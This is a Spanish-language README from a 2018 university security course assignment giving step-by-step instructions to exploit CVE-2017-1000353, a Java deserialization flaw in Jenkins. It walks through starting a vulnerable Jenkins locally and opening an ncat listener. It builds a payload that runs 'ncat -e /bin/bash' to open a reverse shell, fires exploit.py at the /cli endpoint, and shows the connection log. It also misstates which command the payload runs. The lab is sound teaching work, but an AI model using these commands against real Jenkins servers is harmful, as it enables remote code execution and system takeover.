# Seguridad informatica - UTN

## Trabajo práctico 2° Cuatrimestre 2018 - Grupo 2

## Integrantes

- Alejandro Gonzalez
- Facundo Lavagnino
- Tomás Altrui

# Exploit para CVE-2017-1000353 - Jenkins

## Herramientas necesarias

- Java
- Ncat
- Python 3

## Preparación

 1. Clonar el repositorio (e ingresar en el):
    ```$ git clone https://github.com/AltTomas/siutn-tp-grupo-2-2018.git && cd siutn-tp-grupo-2-2018```

 2. Iniciar Jenkins:
    ```$ java -jar jenkins_2.45.war```

3. Ingresar a ```localhost:8080/cli o 127.0.0.1:8080/cli``` para asegurarse que inició correctamente (Solo ingresar la clave que pide al iniciar, no es necesario configurar plugins)
4. Iniciar una sesión de Ncat para escuchar en el puerto 4444 (o el que deseen):
```ncat -v -l -p 4444```

5. Crear el objeto de serialización de Java:
 ```bash generate_java_serialization_data.sh "ncat -e /bin/bash 127.0.0.1 4444"```

## Ejecución del exploit y explicación

Para ejecutar el exploit basta con el siguiente comando:
```python exploit.py http://127.0.0.1:8080/cli java_serialization_data.bin```

Este script de Python inicia una sesión con el CLI de Jenkins realizando un POST al CLI en modo "download":
```
download - Starting new HTTP connection (1): 127.0.0.1:8080
download - http://127.0.0.1:8080 "POST /cli HTTP/1.1" 200 None
```

Luego realiza un "upload" con el payload que contiene como head el objeto serializado en base 64 que especifica la funcionalidad del cliente
```'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='```
y el objeto de serialización de Java que contiene nuestro código a ejecutar, que en este caso es: ```ncat -v -l -p 4444```

En caso que nuestro exploit se haya ejecutado de manera satisfactoria, deberíamos ver en la consola que levantamos nuestra sesión de Ncat un mensaje de conexión:

```
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:57496.
```
